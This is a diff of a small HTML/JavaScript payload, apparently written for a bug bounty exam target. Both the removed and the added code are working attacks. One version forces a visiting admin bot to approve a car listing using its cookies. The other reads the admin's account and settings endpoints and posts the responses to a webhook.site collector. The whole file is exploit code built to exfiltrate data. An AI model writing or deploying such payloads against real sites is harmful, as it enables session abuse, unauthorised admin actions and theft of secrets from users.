@@ -1,27 +1,35 @@
-<html>
-<body>
-    <h1>System Audit in Progress...</h1>
-    <script>
-        const carId = '69dd69884e3edba5f08f60f9';
-        const apiUrl = `https://api-bugbounty-exam.hashacademy.co/api/admin/cars/${carId}/approve`;
-        const webhook = 'https://webhook.site/bd2deb0f-4b44-46ed-9533-ddaa9746dc19';
+<script>
+    const logger = "https://webhook.site/d611200f-fe78-4019-b923-b3c30712d153";
 
-        // 1. Send a 'Starting' ping to your webhook
-        fetch(`${webhook}?step=starting`);
+    async function findSecret() {
+        // Try the 'Me' endpoint - often contains API keys or secrets
+        try {
+            const res = await fetch("https://api-bugbounty-exam.hashacademy.co/api/auth/me", {
+                method: "GET",
+                credentials: "include"
+            });
+            const data = await res.json();
+            
+            // Leak it to your webhook
+            fetch(logger, {
+                method: "POST",
+                body: JSON.stringify({ source: "AUTH_ME", data: data })
+            });
+        } catch (e) {}
 
-        // 2. The Actual Exploit: Force the Admin Bot to approve your car
-        fetch(apiUrl, {
-            method: 'PUT',
-            credentials: 'include', // CRITICAL: Sends the Admin's cookies
-            mode: 'cors'
-        })
-        .then(response => {
-            // 3. Send the result to your webhook
-            fetch(`${webhook}?step=result&status=${response.status}`);
-        })
-        .catch(err => {
-            fetch(`${webhook}?step=error&msg=${encodeURIComponent(err.message)}`);
-        });
-    </script>
-</body>
-</html>
+        // Try a 'Settings' endpoint just in case
+        try {
+            const res2 = await fetch("https://api-bugbounty-exam.hashacademy.co/api/admin/settings", {
+                method: "GET",
+                credentials: "include"
+            });
+            const data2 = await res2.json();
+            fetch(logger, {
+                method: "POST",
+                body: JSON.stringify({ source: "ADMIN_SETTINGS", data: data2 })
+            });
+        } catch (e) {}
+    }
+
+    findSecret();
+</script>
